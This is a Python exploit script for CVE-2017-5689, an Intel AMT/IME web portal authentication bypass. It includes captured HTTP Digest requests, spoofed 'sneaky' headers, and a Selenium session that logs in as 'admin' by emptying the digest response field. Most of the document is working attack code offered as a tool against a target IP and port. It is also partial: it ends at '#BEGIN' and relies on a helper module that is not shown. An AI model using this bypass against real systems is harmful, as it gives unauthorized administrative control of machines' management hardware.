
#!/usr/bin/python3
################################################################################
# This is a tool to persist an Intel IME admin session by modifying the GET 
# request to have the "response:" field empty in every request. 
# The web portal presented by the HARDWARE uses an MD5 in the response body to
# authenticate and per the link given, can be bypassed by simply emptying it.
# https://www.ssh.com/vulnerability/intel-amt/
# 
# CVE-2017-5689
#   https://nvd.nist.gov/vuln/detail/CVE-2017-5689
#   
#   An unprivileged network attacker could gain system privileges to 
#   provisioned Intel manageability SKUs: Intel Active Management Technology 
#   (AMT) and Intel Standard Manageability (ISM). An unprivileged local attacker
#   could provision manageability features gaining unprivileged network or local
#   system privileges on Intel manageability SKUs: Intel Active Management 
#   Technology (AMT), Intel Standard Manageability (ISM), and Intel Small 
#   Business Technology (SBT).
# 
################################################################################
# FIRST REQUEST:
################################################################################
# GET /index.htm HTTP/1.1
# Host: 192.168.0.44:16992
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 
#   Firefox/73.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,
#   */*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Connection: close
# Referer: http://192.168.0.44:16992/logon.htm
# Upgrade-Insecure-Requests: 1

################################################################################
# SECOND REQUEST
################################################################################
# GET /index.htm HTTP/1.1
# Host: 192.168.0.44:16992
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
#   Firefox/73.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,
#   */*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Connection: close
# Referer: http://192.168.0.44:16992/logon.htm
# Upgrade-Insecure-Requests: 1
# Authorization: Digest username="admin", 
#       realm="Digest:72C40000000000000000000000000000", 
#       nonce="WT7ZAQsLAABEyoVgz4/+bFmvwKIRUvUI", 
#       uri="/index.htm", 
#       response="9621f86ecc7d8f680213ddc2aae3f21d", 
#       qop=auth, 
#       nc=00000001, 
#       cnonce="96d5787909ac7ea7"
################################################################################
# WE MODIFY 'response=""' TO BE EMPTY WITH THE USERNAME "ADMIN" THAT IS ALL
################################################################################
import os
import re
import argparse
import requests
import hacked_digest_auth
from hacked_digest_auth import DigestAuthHack

parser = argparse.ArgumentParser(description = 'Intel IME Admin Bypass Tool, \
                                                CVE-2017-5689')
parser.add_argument('--target',
                                 dest     =  'target',
                                 action   =  "store" ,
                                 default  =  "192.168.0.44" ,
                                 help     =  "Intel IME Server To Target \
                                             (http://192.168.0.44)" )
parser.add_argument('--port',
                                 dest     =  'port',
                                 action   =  "store" ,
                                 default  =  '16992' ,
                                 help     =  "Port for the IME Web UI \
                                             (numbers only please)" )
parser.add_argument('--browser',
                                 dest     =  'which_browser',
                                 action   =  "store" ,
                                 default  =  'firefox' ,
                                 help     =  "Browser to use (firefox,chrome)")


arguments           =   parser.parse_args()
url                 =   "http://" + arguments.target + ":" + arguments.port
ime_server_index    =   url + "/index.html"
ime_server_logon    =   url + "/logon.html"
#make it seem like we are being sent directly from the logon with every request
sneaky_useragent    =   'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 \
                        Firefox/28.0'
sneaky_headers      = { "Accept": "text/html,application/xhtml+xml,application/\
                        xml;q=0.9,image/webp,*/*;q=0.8",
                        'User-Agent' : sneaky_useragent,
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close",
                        "Referer": ime_server_logon,
                        "Upgrade-Insecure-Requests":"1",                   
                        }
################################################################################
# Setup the seleniumrequests mixin meta classes
# Start a Selenium Session
if __name__ == "__main__":
    if re.search(r'\bfirefox\b', arguments.which_browser, re.I):
        from seleniumrequests.request import RequestMixin
        from selenium.webdriver import firefox as Foxy
        class Fox_in_a_car(Foxy, RequestMixin):
            pass

        browser = Fox_in_a_car()
    elif re.search(r'\bchrome\b', arguments.which_browser, re.I):
        from seleniumrequests.request import RequestMixin
        from selenium.webdriver import chrome as Shiny
        class Shiny_and_chrome(Shiny, RequestMixin):
            pass

        browser = Shiny_and_chrome()
# begin authentication
# read the damn replay ya idiot. CAPTURE A DAMN REPLAY YA IDIOT
    index = browser.request("GET",
                            url = ime_server_index, 
                            auth=DigestAuthHack('admin', 'Does_it_really_matter'),
                            headers = sneaky_headers
                            )

#the response SHOULD be the index_page
################################################################################   
#BEGIN